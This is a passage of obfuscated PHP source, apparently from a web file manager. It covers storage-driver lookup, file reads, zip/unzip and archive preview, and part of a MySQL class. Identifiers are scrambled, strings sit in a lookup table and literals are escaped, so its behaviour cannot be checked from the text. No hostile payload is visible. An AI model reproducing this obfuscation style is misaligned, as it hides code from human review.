=> rtrim($˚±‚å”Ò, $€ß–å÷[8]) . $€ß–å÷[8] . $≠≈ääÜä, $€ß–å÷[1147] => $îÜî‹ÓŒ); } $™™”Ûâﬂ = array($€ß–å÷[192] => $¯ùµ∂≈á, $€ß–å÷[79] => $Ã‘⁄ÿ™æ); Hook::trigger($€ß–å÷[1148], $ŸäÒπæ«, $˚±‚å”Ò, $™™”Ûâﬂ); foreach ($Ã‘⁄ÿ™æ as $îÜî‹ÓŒ) { IO::mkdir($îÜî‹ÓŒ); } foreach ($¯ùµ∂≈á as $îÜî‹ÓŒ) { IO::copy($îÜî‹ÓŒ[$€ß–å÷[1145]], $îÜî‹ÓŒ[$€ß–å÷[1146]], REPEAT_REPLACE); } } private static function _listAll($‹òÇ∆ÅÊ) { $ç¸≥êëº =& $_SERVER[Çâä∆◊¡]; $‹òÇ∆ÅÊ = KodIO::clear($‹òÇ∆ÅÊ); $ÿº—…ªõ = IO::listAll($‹òÇ∆ÅÊ); foreach ($ÿº—…ªõ as &$Î∆∂À∫¯) { $„‰äŒ“ú = substr($Î∆∂À∫¯[$ç¸≥êëº[78]], strlen($‹òÇ∆ÅÊ)); $Î∆∂À∫¯[$ç¸≥êëº[1149]] = trim($„‰äŒ“ú, $ç¸≥êëº[8]); } unset($Î∆∂À∫¯); return array_to_keyvalue($ÿº—…ªõ, $ç¸≥êëº[1149]); } public static function fileSubstr($µò ﬂËê, $’≥Ë≥´‹, $£ª¢ã›∆ = false) { $åúÿÖ÷“ =& $_SERVER[Çâä∆◊¡]; $Óãä‘·π = self::driverMake($µò ﬂËê); $≈à§™Œ± = $Óãä‘·π->size($µò ﬂËê); $ø¶∞ß˜Ã = $’≥Ë≥´‹; $ˆÎ¡Ïü¶ = $£ª¢ã›∆; if ($’≥Ë≥´‹ < 0) { $’≥Ë≥´‹ = $≈à§™Œ± + $’≥Ë≥´‹; } if ($£ª¢ã›∆ === !1) { $£ª¢ã›∆ = $≈à§™Œ± - $’≥Ë≥´‹; } if ($’≥Ë≥´‹ + $£ª¢ã›∆ > $≈à§™Œ±) { $£ª¢ã›∆ = $≈à§™Œ± - $’≥Ë≥´‹; } if (!$≈à§™Œ± && $Óãä‘·π->getType() == $åúÿÖ÷“[107] && !$Óãä‘·π->exist($µò ﬂËê)) { throw new Exception($åúÿÖ÷“[1150] . LNG($åúÿÖ÷“[1151]) . $åúÿÖ÷“[953] . get_path_this($µò ﬂËê) . $åúÿÖ÷“[12]); } if ($£ª¢ã›∆ <= 0) { return $åúÿÖ÷“[12]; } if ($’≥Ë≥´‹ < 0 || $’≥Ë≥´‹ >= $≈à§™Œ± || $£ª¢ã›∆ > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\122\x65\x61\x64\x20\x65\x72\162\x6f\x72\41\40\x73\x74\141\162\164\x3d{$’≥Ë≥´‹}\73\154\x65\x6e\x67\x74\x68\x3d{$£ª¢ã›∆}\x3b\40\163\151\172\145\75{$≈à§™Œ±}\x3b"); } $¿≠±™≈Æ = $Óãä‘·π->fileSubstr($µò ﬂËê, $’≥Ë≥´‹, $£ª¢ã›∆); if (!$¿≠±™≈Æ && $£ª¢ã›∆ && isset($GLOBALS[$åúÿÖ÷“[1152]])) { throw new Exception($GLOBALS[$åúÿÖ÷“[1152]][$åúÿÖ÷“[1153]]); } return $¿≠±™≈Æ; } private static function driverMake(&$ôÚÑË¯·) { $òîìù∆ö =& $_SERVER[Çâä∆◊¡]; $ΩóÔàøô = KodIO::parse($ôÚÑË¯·); if (!self::$driverListSystem) { $û‚ûœÛı = Model($òîìù∆ö[760])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($û‚ûœÛı, $òîìù∆ö[401]); } if ($ΩóÔàøô[$òîìù∆ö[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ΩóÔàøô[$òîìù∆ö[401]]]) { return !1; } $ôÚÑË¯· = $ΩóÔàøô[$òîìù∆ö[1154]]; $ íÿÖÂı = self::driverGet($ΩóÔàøô, $ôÚÑË¯·); return $ íÿÖÂı; } private static function driverGet($¡€ÊÖ’ﬂ, &$ãá“∞Êõ) { $´˚‡©…ï =& $_SERVER[Çâä∆◊¡]; $±é‚≤Ì§ = $¡€ÊÖ’ﬂ[$´˚‡©…ï[1155]]; $¶¨öÓÆ÷ = $¡€ÊÖ’ﬂ[$´˚‡©…ï[401]]; switch ($¡€ÊÖ’ﬂ[$´˚‡©…ï[33]]) { case KodIO::KOD_IO: $îÃóÁÒÿ = self::$driverListSystem[$¶¨öÓÆ÷]; break; case KodIO::KOD_SOURCE: $ãá“∞Êõ = $¶¨öÓÆ÷ . $ãá“∞Êõ; $îÃóÁÒÿ = array($´˚‡©…ï[1156] => $´˚‡©…ï[1157], $´˚‡©…ï[6] => $¡€ÊÖ’ﬂ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $û‚º∑÷ô = $GLOBALS[$´˚‡©…ï[1158]]; self::$driverListUser = array_to_keyvalue($û‚º∑÷ô, $´˚‡©…ï[401]); } $îÃóÁÒÿ = self::$driverListUser[$¶¨öÓÆ÷]; break; case KodIO::KOD_SHARE_LINK: $îÃóÁÒÿ = array($´˚‡©…ï[1156] => $´˚‡©…ï[1159], $´˚‡©…ï[6] => $¡€ÊÖ’ﬂ); $Ô‚£∏÷ = Action($´˚‡©…ï[1160])->sharePathInfo($¡€ÊÖ’ﬂ[$´˚‡©…ï[78]]); $ãá“∞Êõ = $Ô‚£∏÷[$´˚‡©…ï[403]]; if (!$Ô‚£∏÷[$´˚‡©…ï[403]]) { $’–¬‘¬© = Model($´˚‡©…ï[595])->getInfo($Ô‚£∏÷[$´˚‡©…ï[488]]); $ãá“∞Êõ = KodIO::clear($’–¬‘¬©[$´˚‡©…ï[1161]] . $¡€ÊÖ’ﬂ[$´˚‡©…ï[1154]]); $¡€ÊÖ’ﬂ[$´˚‡©…ï[486]] = $’–¬‘¬©; $¡€ÊÖ’ﬂ[$´˚‡©…ï[1138]] = $ãá“∞Êõ; $îÃóÁÒÿ = array($´˚‡©…ï[1156] => $´˚‡©…ï[1162], $´˚‡©…ï[6] => $¡€ÊÖ’ﬂ); } break; case KodIO::KOD_SHARE_ITEM: $îÃóÁÒÿ = array($´˚‡©…ï[1156] => $´˚‡©…ï[1163], $´˚‡©…ï[6] => $¡€ÊÖ’ﬂ); $’–¬‘¬© = Model($´˚‡©…ï[595])->getInfo($¡€ÊÖ’ﬂ[$´˚‡©…ï[401]]); if ($’–¬‘¬©[$´˚‡©…ï[403]] == $´˚‡©…ï[190]) { $ãá“∞Êõ = KodIO::clear($’–¬‘¬©[$´˚‡©…ï[1161]] . $¡€ÊÖ’ﬂ[$´˚‡©…ï[1154]]); $¡€ÊÖ’ﬂ[$´˚‡©…ï[486]] = $’–¬‘¬©; $¡€ÊÖ’ﬂ[$´˚‡©…ï[1138]] = $ãá“∞Êõ; $îÃóÁÒÿ = array($´˚‡©…ï[1156] => $´˚‡©…ï[1164], $´˚‡©…ï[6] => $¡€ÊÖ’ﬂ); } else { if (!$ãá“∞Êõ) { $ãá“∞Êõ = $’–¬‘¬©[$´˚‡©…ï[403]]; } } break; default: $ãá“∞Êõ = $¡€ÊÖ’ﬂ[$´˚‡©…ï[78]]; $îÃóÁÒÿ = array($´˚‡©…ï[1156] => $´˚‡©…ï[1165]); break; } $‡Ç‘Õî¢ = $¡€ÊÖ’ﬂ[$´˚‡©…ï[78]]; if (!isset(self::$driverCache[$‡Ç‘Õî¢])) { $„ÄÒ¢ß‘ = strtolower($îÃóÁÒÿ[$´˚‡©…ï[96]]); $≤™òÎ“ú = $GLOBALS[$´˚‡©…ï[6]][$´˚‡©…ï[90]][$´˚‡©…ï[819]]; $ï·®§ó¨ = $´˚‡©…ï[74] . (isset($≤™òÎ“ú[$„ÄÒ¢ß‘]) ? $≤™òÎ“ú[$„ÄÒ¢ß‘] : ucfirst($„ÄÒ¢ß‘)); if (!class_exists($ï·®§ó¨)) { show_json("{$ï·®§ó¨}\x20\x6e\157\164\x20\145\x78\151\163\x74\163\41", !1); } $‡òòº’« = isset($îÃóÁÒÿ[$´˚‡©…ï[6]]) ? $îÃóÁÒÿ[$´˚‡©…ï[6]] : !1; self::$driverCache[$‡Ç‘Õî¢] = new $ï·®§ó¨($‡òòº’«); } $Ó˚ñ‚´Ä = self::$driverCache[$‡Ç‘Õî¢]; $Ó˚ñ‚´Ä->pathDriver = $±é‚≤Ì§; $Ó˚ñ‚´Ä->pathBase = $´˚‡©…ï[12]; if (isset($îÃóÁÒÿ[$´˚‡©…ï[6]][$´˚‡©…ï[1166]])) { $Ó˚ñ‚´Ä->pathBase = rtrim($îÃóÁÒÿ[$´˚‡©…ï[6]][$´˚‡©…ï[1166]], $´˚‡©…ï[8]) . $´˚‡©…ï[8]; $ãá“∞Êõ = $Ó˚ñ‚´Ä->pathBase . ltrim($ãá“∞Êõ, $´˚‡©…ï[8]); } $ãá“∞Êõ = $Ó˚ñ‚´Ä->getPath($ãá“∞Êõ); if (isset($¡€ÊÖ’ﬂ[$´˚‡©…ï[1138]])) { $ãá“∞Êõ = $¡€ÊÖ’ﬂ[$´˚‡©…ï[1138]]; } $Ó˚ñ‚´Ä->path = $ãá“∞Êõ; return $Ó˚ñ‚´Ä; } public static function errorTips($’∫‰÷¯à = false) { $Î¶Å“˚É =& $_SERVER[Çâä∆◊¡]; static $Îµåó√ü = array(); $’Ü…ñ†Ê = 1000; if ($’∫‰÷¯à === -1) { return $Îµåó√ü ? $Îµåó√ü[count($Îµåó√ü) - 1] : $Î¶Å“˚É[12]; } if ($’∫‰÷¯à === !1) { return implode($Î¶Å“˚É[226], $Îµåó√ü); } if (count($Îµåó√ü) >= $’Ü…ñ†Ê) { $Îµåó√ü = array_slice($Îµåó√ü, $’Ü…ñ†Ê * 0.5, $’Ü…ñ†Ê); } $Îµåó√ü[] = $’∫‰÷¯à; write_log($Î¶Å“˚É[159] . ACTION . $Î¶Å“˚É[1167] . $’∫‰÷¯à, $Î¶Å“˚É[1168]); } public static function getLastError($≤Ÿ‹œ—ú = '') { $•º‰∑àØ = self::errorTips(-1); return $•º‰∑àØ ? $•º‰∑àØ : $≤Ÿ‹œ—ú; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $£ºÖì÷Ÿ; if (!$£ºÖì÷Ÿ) { $ôËúº¨Ê = IO::init($_SERVER[Çâä∆◊¡][8]); } return $ôËúº¨Ê; } private static function iconvSystem($ôï˜ŒàÖ) { return self::local()->iconvSystem($ôï˜ŒàÖ); } private static function iconvApp($∞´ËÏ¶Ñ) { return self::local()->iconvApp($∞´ËÏ¶Ñ); } public static function zip($œıúÚÈÿ, $É ÷… Ò = "\x7a\x69\160", $å’≈§Ñ¯ = '', $Í‘÷˚‡Ä = REPEAT_RENAME) { $„√≈’¯∑ =& $_SERVER[Çâä∆◊¡]; $úí€Ò¡˚ = self::init($œıúÚÈÿ[0][$„√≈’¯∑[78]]); $‘…≤≤Ïª = self::info($œıúÚÈÿ[0][$„√≈’¯∑[78]]); $‡ÄÍñï∫ = !1; if (!$å’≈§Ñ¯ && $úí€Ò¡˚->getType() == $„√≈’¯∑[107]) { $ﬁö˛üëÁ = self::zipFileList($œıúÚÈÿ); } else { $‡ÄÍñï∫ = $å’≈§Ñ¯ ? $å’≈§Ñ¯ : TEMP_FILES . $„√≈’¯∑[1169] . time() . rand_string(8) . $„√≈’¯∑[8]; mk_dir($‡ÄÍñï∫); $ﬁö˛üëÁ = self::zipFileList($œıúÚÈÿ, $‡ÄÍñï∫); } $”•ü·¨« = $‘…≤≤Ïª[$„√≈’¯∑[32]]; if (count($ﬁö˛üëÁ) > 1) { $÷òö⁄Ìœ = IO::info(IO::pathFather($‘…≤≤Ïª[$„√≈’¯∑[78]])); $”•ü·¨« = $÷òö⁄Ìœ[$„√≈’¯∑[32]]; } $“ÊÁ†∑í = $‡ÄÍñï∫; if (!$“ÊÁ†∑í) { $“ÊÁ†∑í = get_path_father($‘…≤≤Ïª[$„√≈’¯∑[78]]); if (!$å’≈§Ñ¯ && $úí€Ò¡˚->getType() == $„√≈’¯∑[107]) { $“ÊÁ†∑í = get_path_father($úí€Ò¡˚->path); } $ÇÛΩÔ®Ø = IO::info($“ÊÁ†∑í); if (!$ÇÛΩÔ®Ø[$„√≈’¯∑[195]]) { show_json(LNG($„√≈’¯∑[1170]), !1); } } $ıïâ∆Ωˆ = $“ÊÁ†∑í . $”•ü·¨« . $„√≈’¯∑[10] . $É ÷… Ò; $ıïâ∆Ωˆ = get_filename_auto($ıïâ∆Ωˆ, $„√≈’¯∑[12], $Í‘÷˚‡Ä); $Ï‰’˘ù = self::iconvSystem($ıïâ∆Ωˆ); foreach ($ﬁö˛üëÁ as $ìé¿ò±› => $ßΩˆ∑Ø∂) { $ﬁö˛üëÁ[$ìé¿ò±›] = self::iconvSystem($ßΩˆ∑Ø∂); } KodArchive::create($Ï‰’˘ù, $ﬁö˛üëÁ); if (!IO::exist($ıïâ∆Ωˆ)) { if ($‡ÄÍñï∫) { del_dir($‡ÄÍñï∫); } show_json(LNG($„√≈’¯∑[1171]), !1); } if ($å’≈§Ñ¯ || !$‡ÄÍñï∫) { if ($‡ÄÍñï∫ && strstr($‡ÄÍñï∫, TEMP_FILES)) { $˜Éπ∞∏Ó = $ﬁö˛üëÁ = array(); recursion_dir($“ÊÁ†∑í, $˜Éπ∞∏Ó, $ﬁö˛üëÁ, 0); foreach ($˜Éπ∞∏Ó as $ÛÒ¶ﬂÿ°) { del_dir($ÛÒ¶ﬂÿ°); } foreach ($ﬁö˛üëÁ as $“Æ∞Ëø“) { if ($“Æ∞Ëø“ == $Ï‰’˘ù) { continue; } del_file($“Æ∞Ëø“); } } return $ıïâ∆Ωˆ; } $œÎåÂß• = self::pathFather($‘…≤≤Ïª[$„√≈’¯∑[78]]); $Ò◊Ôß¬Í = self::move($ıïâ∆Ωˆ, $œÎåÂß•, $Í‘÷˚‡Ä); if (!$Ò◊Ôß¬Í) { del_dir($‡ÄÍñï∫); show_json(LNG($„√≈’¯∑[1171]), !1); } del_dir($‡ÄÍñï∫); return $Ò◊Ôß¬Í; } public static function unzip($¶Úøı±ª, $¨‹‚∏Îé = "\x72\145\160\x6c\141\143\145") { $‰Úœ∆Ÿª =& $_SERVER[Çâä∆◊¡]; $ªÔ˜√Ë… = $¶Úøı±ª[$‰Úœ∆Ÿª[78]]; $âé≠é–Ø = $¶Úøı±ª[$‰Úœ∆Ÿª[1172]]; if (!($˘≥ß«ÿ = parent::info($ªÔ˜√Ë…))) { show_json(LNG($‰Úœ∆Ÿª[1173]), !1); } if (!($‘ÃÜ„ˆª = parent::infoFull($âé≠é–Ø))) { $âé≠é–Ø = parent::mkdir($âé≠é–Ø); $‘ÃÜ„ˆª = array($‰Úœ∆Ÿª[78] => $âé≠é–Ø); } else { if (isset($‘ÃÜ„ˆª[$‰Úœ∆Ÿª[403]]) && trim($‘ÃÜ„ˆª[$‰Úœ∆Ÿª[78]], $‰Úœ∆Ÿª[8]) != trim($âé≠é–Ø, $‰Úœ∆Ÿª[8])) { $ÚÚ˝úöì = KodIO::make($‘ÃÜ„ˆª[$‰Úœ∆Ÿª[498]]); $ÈÿúÛÖ• = parent::fileNameAuto($ÚÚ˝úöì, $‘ÃÜ„ˆª[$‰Úœ∆Ÿª[32]], REPEAT_RENAME_FOLDER, !0); $âé≠é–Ø = parent::mkdir($ÚÚ˝úöì . $ÈÿúÛÖ•); $‘ÃÜ„ˆª = array($‰Úœ∆Ÿª[78] => $âé≠é–Ø); } } $âé≠é–Ø = $‘ÃÜ„ˆª[$‰Úœ∆Ÿª[78]]; $Ëïﬁ≤£Ç = self::tmpFileName($˘≥ß«ÿ); $Ùœ£®•µ = TEMP_FILES . $Ëïﬁ≤£Ç; del_dir($Ùœ£®•µ); mk_dir($Ùœ£®•µ); $óˆØÉÓˆ = self::fileExt($˘≥ß«ÿ); $®√Øœ’¬ = $Ùœ£®•µ . $‰Úœ∆Ÿª[10] . $óˆØÉÓˆ; if (!@file_exists(self::iconvSystem($®√Øœ’¬))) { $ñ∑ùÈ»û = self::localFilePath($ªÔ˜√Ë…, $óˆØÉÓˆ); $®√Øœ’¬ = $ñ∑ùÈ»û ? $ñ∑ùÈ»û : parent::download($ªÔ˜√Ë…, $®√Øœ’¬); } $®√Øœ’¬ = self::iconvSystem($®√Øœ’¬); $…⁄©íÕ† = isset($¶Úøı±ª[$‰Úœ∆Ÿª[1174]]) ? $¶Úøı±ª[$‰Úœ∆Ÿª[1174]] : $‰Úœ∆Ÿª[1175]; $›˚ÒπÃ√ = KodArchive::extract($®√Øœ’¬, $Ùœ£®•µ . $‰Úœ∆Ÿª[8], $…⁄©íÕ†); self::archiveExt(); if (!$›˚ÒπÃ√[$‰Úœ∆Ÿª[1176]]) { show_json($‰Úœ∆Ÿª[1177] . $›˚ÒπÃ√[$‰Úœ∆Ÿª[1178]], !1); } Hook::trigger($‰Úœ∆Ÿª[1179], $Ùœ£®•µ); recursion_dir($Ùœ£®•µ, $Ëﬁ‰ö´ , $≠›ÉÖ˙°, 0); $≥ÂıÍØ≈ = array_merge($Ëﬁ‰ö´ , $≠›ÉÖ˙°); foreach ($≥ÂıÍØ≈ as $°Î≈˛˘¨) { $°Î≈˛˘¨ = self::iconvApp($°Î≈˛˘¨); self::move($°Î≈˛˘¨, $âé≠é–Ø, $¨‹‚∏Îé); } del_dir($Ùœ£®•µ); if (!$ñ∑ùÈ»û) { del_file($®√Øœ’¬); } return !0; } public static function unzipList($Íå∑¸®⁄) { $€ΩôØ»à =& $_SERVER[Çâä∆◊¡]; $“‹Ñã£ﬂ = $Íå∑¸®⁄[$€ΩôØ»à[78]]; $ı™›©˜† = isset($Íå∑¸®⁄[$€ΩôØ»à[1180]]) ? $Íå∑¸®⁄[$€ΩôØ»à[1180]] : -1; $Ì•Ï§–∞ = 50000; if (request_url_safe($“‹Ñã£ﬂ)) { $ªëÏ‹Ù– = parse_url_query($“‹Ñã£ﬂ); if (!isset($ªëÏ‹Ù–[$€ΩôØ»à[78]])) { show_json($€ΩôØ»à[1181], !1); } } $»¨‰◊Ãô = isset($ªëÏ‹Ù–) ? $ªëÏ‹Ù–[$€ΩôØ»à[78]] : $“‹Ñã£ﬂ; $›∞ﬂæ´˜ = self::info($»¨‰◊Ãô); $›‰¥˛Ø” = self::fileExt($›∞ﬂæ´˜); $ÉÃØÈ¶Ÿ = self::tmpFileName($›∞ﬂæ´˜); if (isset($ªëÏ‹Ù–)) { $‚çô…åà = array($ªëÏ‹Ù–[$€ΩôØ»à[78]], $ªëÏ‹Ù–[$€ΩôØ»à[1180]], $ªëÏ‹Ù–[$€ΩôØ»à[32]]); $¸£‡Ï¶— = md5(implode($€ΩôØ»à[11], $‚çô…åà)) . $€ΩôØ»à[10] . get_path_ext($ªëÏ‹Ù–[$€ΩôØ»à[32]]); } else { $‚çô…åà = array($›∞ﬂæ´˜[$€ΩôØ»à[32]], $›∞ﬂæ´˜[$€ΩôØ»à[78]], $›∞ﬂæ´˜[$€ΩôØ»à[80]]); $¸£‡Ï¶— = md5(implode($€ΩôØ»à[11], $‚çô…åà)) . $€ΩôØ»à[10] . $›‰¥˛Ø”; } if ($ı™›©˜† == -1) { $Á∏Ì§åÃ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\151\x65\x77\x2f{$ÉÃØÈ¶Ÿ}\x2f{$¸£‡Ï¶—}\56\x6c\x6f\147"; $„æﬂï‰˜ = self::infoFull($Á∏Ì§åÃ); if ($„æﬂï‰˜) { $Á∏Ì§åÃ = $„æﬂï‰˜[$€ΩôØ»à[78]]; $ÁÑ”Œﬂ¿ = self::getContent($Á∏Ì§åÃ); if ($ÁÑ”Œﬂ¿) { $”ì«Û˛Æ = json_decode($ÁÑ”Œﬂ¿, !0); $”ì«Û˛Æ = is_array($”ì«Û˛Æ) ? $”ì«Û˛Æ : array(); if (count($”ì«Û˛Æ) >= $Ì•Ï§–∞) { show_json(sprintf(LNG($€ΩôØ»à[1182]), count($”ì«Û˛Æ)), !1); } return $”ì«Û˛Æ; } } else { $Á∏Ì§åÃ = self::mkfile($Á∏Ì§åÃ); } } $ìÚ¨¸”ú = TEMP_FILES . $ÉÃØÈ¶Ÿ; if (!is_dir($ìÚ¨¸”ú)) { mk_dir($ìÚ¨¸”ú); } $¸Í´˝Ñˆ = $ìÚ¨¸”ú . $€ΩôØ»à[8] . $¸£‡Ï¶—; if (!@file_exists(self::iconvSystem($¸Í´˝Ñˆ))) { if (isset($ªëÏ‹Ù–)) { url_request($“‹Ñã£ﬂ, $€ΩôØ»à[1183], $¸Í´˝Ñˆ); } else { $µ°ÖÁ§» = self::localFilePath($“‹Ñã£ﬂ, $›‰¥˛Ø”); $¸Í´˝Ñˆ = $µ°ÖÁ§» ? $µ°ÖÁ§» : self::download($“‹Ñã£ﬂ, $¸Í´˝Ñˆ); } } $¸Í´˝Ñˆ = self::iconvSystem($¸Í´˝Ñˆ); if ($ı™›©˜† >= 0) { $∑‹áàÉ = isset($Íå∑¸®⁄[$€ΩôØ»à[1184]]) ? $Íå∑¸®⁄[$€ΩôØ»à[1184]] : !1; $˘ÚÔáúÕ = isset($Íå∑¸®⁄[$€ΩôØ»à[32]]) ? $Íå∑¸®⁄[$€ΩôØ»à[32]] : $€ΩôØ»à[12]; KodArchive::filePreview($¸Í´˝Ñˆ, $ı™›©˜†, $∑‹áàÉ, $˘ÚÔáúÕ); self::archiveExt(); die; } $ÍÎÖıÂ¶ = KodArchive::listContent($¸Í´˝Ñˆ); self::archiveExt(); del_dir($ìÚ¨¸”ú); if (!$ÍÎÖıÂ¶[$€ΩôØ»à[1176]]) { show_json($ÍÎÖıÂ¶[$€ΩôØ»à[1178]], !1); } $”ì«Û˛Æ = json_encode($ÍÎÖıÂ¶[$€ΩôØ»à[1178]]); self::setContent($Á∏Ì§åÃ, $”ì«Û˛Æ); if (count($ÍÎÖıÂ¶[$€ΩôØ»à[1178]]) >= $Ì•Ï§–∞) { show_json(sprintf(LNG($€ΩôØ»à[1182]), count($ÍÎÖıÂ¶[$€ΩôØ»à[1178]])), !1); } return $ÍÎÖıÂ¶[$€ΩôØ»à[1178]]; } private static function fileExt($Ÿ¢õ∞∏õ) { $√¿úÌÚÔ =& $_SERVER[Çâä∆◊¡]; $≠ÃÍŸ±Ô = $Ÿ¢õ∞∏õ[$√¿úÌÚÔ[167]]; if ($≠ÃÍŸ±Ô == $√¿úÌÚÔ[1185]) { $€ôÈ®â› = $√¿úÌÚÔ[1186]; if (substr($Ÿ¢õ∞∏õ[$√¿úÌÚÔ[32]], -strlen($€ôÈ®â›)) == $€ôÈ®â›) { $≠ÃÍŸ±Ô = $√¿úÌÚÔ[1187]; } } self::archiveExt($≠ÃÍŸ±Ô); return $≠ÃÍŸ±Ô; } private static function zipFileList($µëªó—ã, $’œ’ˆ≠≥ = false) { $ÜÔø≠è =& $_SERVER[Çâä∆◊¡]; $ÃÊ÷µ¯â = array(); foreach ($µëªó—ã as $Í‰¯Ò‘ô) { $Ω•Ì“≤· = $Í‰¯Ò‘ô[$ÜÔø≠è[78]]; if ($’œ’ˆ≠≥) { $Ω•Ì“≤· = self::copy($Í‰¯Ò‘ô[$ÜÔø≠è[78]], $’œ’ˆ≠≥, $ÜÔø≠è[811]); } else { $ì™£÷¸ó = self::init($Í‰¯Ò‘ô[$ÜÔø≠è[78]]); if ($ì™£÷¸ó->getType() == $ÜÔø≠è[107]) { $Ω•Ì“≤· = $ì™£÷¸ó->path; } } if ($Ω•Ì“≤· && self::local()->exist($Ω•Ì“≤·)) { $ÃÊ÷µ¯â[$Í‰¯Ò‘ô[$ÜÔø≠è[78]]] = $Ω•Ì“≤·; } } if (!empty($ÃÊ÷µ¯â)) { return array_values($ÃÊ÷µ¯â); } show_json(LNG($ÜÔø≠è[1151]), !1); } public static function tmpFileName($Àπ˜˘ô) { $È◊´±˛Ñ =& $_SERVER[Çâä∆◊¡]; $ÌïÛùå’ = array($Àπ˜˘ô[$È◊´±˛Ñ[32]], $Àπ˜˘ô[$È◊´±˛Ñ[78]], $Àπ˜˘ô[$È◊´±˛Ñ[80]], $Àπ˜˘ô[$È◊´±˛Ñ[521]]); return md5(implode($È◊´±˛Ñ[11], $ÌïÛùå’)); } private static function localFilePath($è°∂…Á∫, $ˆÔ¨¿ ∑) { $©⁄àÆ¸ =& $_SERVER[Çâä∆◊¡]; if ($ˆÔ¨¿ ∑ == $©⁄àÆ¸[1188] && strtoupper(substr(PHP_OS, 0, 3)) == $©⁄àÆ¸[1189]) { return !1; } $ıÎçñº∫ = KodIO::parse($è°∂…Á∫); if ($ıÎçñº∫[$©⁄àÆ¸[33]] == KodIO::KOD_SOURCE) { $˘ﬁπ∏∑∑ = Model($©⁄àÆ¸[818])->fileInfoGet(KodIO::sourceID($è°∂…Á∫)); if (!$˘ﬁπ∏∑∑[$©⁄àÆ¸[78]]) { show_json($©⁄àÆ¸[1190], !1); } $è°∂…Á∫ = $˘ﬁπ∏∑∑[$©⁄àÆ¸[78]]; } $ÌÌé•ÀÆ = self::init($è°∂…Á∫); if ($ÌÌé•ÀÆ->pathParse[$©⁄àÆ¸[1138]]) { $è°∂…Á∫ = $ÌÌé•ÀÆ->pathParse[$©⁄àÆ¸[1138]]; $ÌÌé•ÀÆ = self::init($è°∂…Á∫); } $≠à®·ÿä = $ÌÌé•ÀÆ->getType(); if ($≠à®·ÿä == $©⁄àÆ¸[107] || $≠à®·ÿä == $©⁄àÆ¸[1191]) { if (!$ÌÌé•ÀÆ->exist($ÌÌé•ÀÆ->path)) { show_json(LNG($©⁄àÆ¸[106]), !1); } return $ÌÌé•ÀÆ->path; } return !1; } private static function archiveExt($Á˜ıå˜≈ = '') { $GLOBALS[$_SERVER[Çâä∆◊¡][1192]] = $Á˜ıå˜≈; } } goto BÜ“¡ØÌﬁ‚; BË—•†â¿à: class DbMysql extends Db { public function __construct($≤°◊ÏÈ„ = '') { $´«ˆò‡µ =& $_SERVER[Çâä∆◊¡]; if (!extension_loaded($´«ˆò‡µ[797])) { think_exception(think_lang($´«ˆò‡µ[14]) . $´«ˆò‡µ[872]); } if (!empty($≤°◊ÏÈ„)) { $this->config = $≤°◊ÏÈ„; if (empty($this->config[$´«ˆò‡µ[17]])) { $this->config[$´«ˆò‡µ[17]] = $´«ˆò‡µ[12]; } } } public function connect($Å›Å°¬◊ = '', $€‚ııåÇ = 0, $ãåﬁ™Ñ = false) { $ﬂÇ∑†éê =& $_SERVER[Çâä∆◊¡]; if (!isset($this->linkID[$€‚ııåÇ])) { if (empty($Å›Å°¬◊)) { $Å›Å°¬◊ = $this->config; } $åﬁÂ‹ﬂà = $Å›Å°¬◊[$ﬂÇ∑†éê[873]] . ($Å›Å°¬◊[$ﬂÇ∑†éê[874]] ? "\x3a{$Å›Å°¬◊[$ﬂÇ∑†éê[874]]}" : $ﬂÇ∑†éê[12]); $π˙ßˆ¥ = !empty($Å›Å°¬◊[$ﬂÇ∑†éê[17]][$ﬂÇ∑†éê[18]]) ? $Å›Å°¬◊[$ﬂÇ∑†éê[17]][$ﬂÇ∑†éê[18]] : $this->pconnect; if ($π˙ßˆ¥) { $this->linkID[$€‚ııåÇ] = mysql_pconnect($åﬁÂ‹ﬂà, $Å›Å°¬◊[$ﬂÇ∑†éê[875]], $Å›Å°¬◊[$ﬂÇ∑†éê[876]], 131072); } else { $this->linkID[$€‚ııåÇ] = mysql_connect($åﬁÂ‹ﬂà, $Å›Å°¬◊[$ﬂÇ∑†éê[875]], $Å›Å°¬◊[$ﬂÇ∑†éê[876]], !0, 131072); } if (!$this->linkID[$€‚ııåÇ] || !empty($Å›Å°¬◊[$ﬂÇ∑†éê[21]]) && !mysql_select_db($Å›Å°¬◊[$ﬂÇ∑†éê[21]], $this->linkID[$€‚ııåÇ])) { think_exception(mysql_error()); } $åØÇ•æÿ = mysql_get_server_info($this->linkID[$€‚ııåÇ]); mysql_query($ﬂÇ∑†éê[877] . think_config($ﬂÇ∑†éê[878]) . $ﬂÇ∑†éê[58], $this->linkID[$€‚ııåÇ]); if ($åØÇ•æÿ > $ﬂÇ∑†éê[879]) { mysql_query($ﬂÇ∑†éê[880], $this->linkID[$€‚ııåÇ]); } $this->connected = !0; if (1 != think_config($ﬂÇ∑†éê[22])) { unset($this->config); } } return $this->linkID[$€‚ııåÇ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ù¬®∞è˘) { $ê±£¬á¸ =& $_SERVER[Çâä∆◊¡]; if (0 === stripos($Ù¬®∞è˘, $ê±£¬á¸[259])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ù¬®∞è˘; if ($this->queryID) { $this->free(); } think_action_status($ê±£¬á¸[23], 1); think_status($ê±£¬á¸[24]); $this->queryID = mysql_query($Ù¬®∞è˘, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($‘∏—§µÀ) { $˚äº€’í =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘∏—§µÀ; if ($this->queryID) { $this->free(); } think_action_status($˚äº€’í[25], 1); think_status($˚äº€’í[24]); $ç◊ﬂêÆÜ = mysql_query($‘∏—§µÀ, $this->_linkID); $this->debug(); if (!1 === $ç◊ﬂêÆÜ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if 